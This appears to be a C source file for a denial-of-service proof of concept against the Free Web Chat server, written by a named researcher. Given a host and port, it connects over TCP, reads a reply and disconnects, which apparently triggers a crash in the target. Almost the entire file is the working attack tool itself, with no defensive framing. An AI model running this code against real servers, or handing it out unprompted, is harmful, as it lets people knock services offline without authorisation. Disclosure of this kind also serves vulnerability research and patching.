/*
     Free Web Chat (Initial Release)- DoS - Proof Of Concept
     Coded by: Donato Ferrante
*/



#include <stdio.h>
#include <stdlib.h>

#ifdef WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

#define VERSION "0.1"





void FreeWebChatPoC( char *host, int port );
u_long resolv(char *host);




int main(int argc, char *argv[]) {

   fprintf(
        stdout,
        "\n\nFree Web Chat - DoS - Proof Of Concept\n"
        "Version: %s\n\n"
        "coded by: Donato Ferrante\n"
        "e-mail:   fdonato@autistici.org\n"
        "web:      www.autistici.org/fdonato\n\n"
        , VERSION
        );

  if(argc <= 2){
     fprintf(stdout, "Usage: <host> <port>");
     exit(-1);
  }

int port = atoi(argv[2]);

#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    FreeWebChatPoC( argv[1], port );

    return(0);
}







   void FreeWebChatPoC( char *host, int port ){

    struct sockaddr_in peer;

    int sd,
        err;

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    char *buff = (char *)malloc(513);

    fprintf(
            stdout,
            "\nConnecting to: %s:%hu\n\n",
            inet_ntoa(peer.sin_addr),
            port
          );

      sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
           if(sd < 0){
                perror("Error");
                exit(-1);
           }

      err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
           if(err < 0){
                perror("Error");
                exit(-1);
           }

      err = recv(sd, buff, 512, 0);
           if(err < 0){
                perror("Error");
                exit(-1);
           }

#ifdef WIN32
      closesocket(sd);
#else
      close(sd);
#endif

    free(buff);

    fprintf(
          stdout,
          "\nFree_Web_Chat - DoS - Proof_Of_Concept terminated.\n\n"
    );

}




u_long resolv(char *host) {
    struct      hostent *hp;
    u_long      host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}





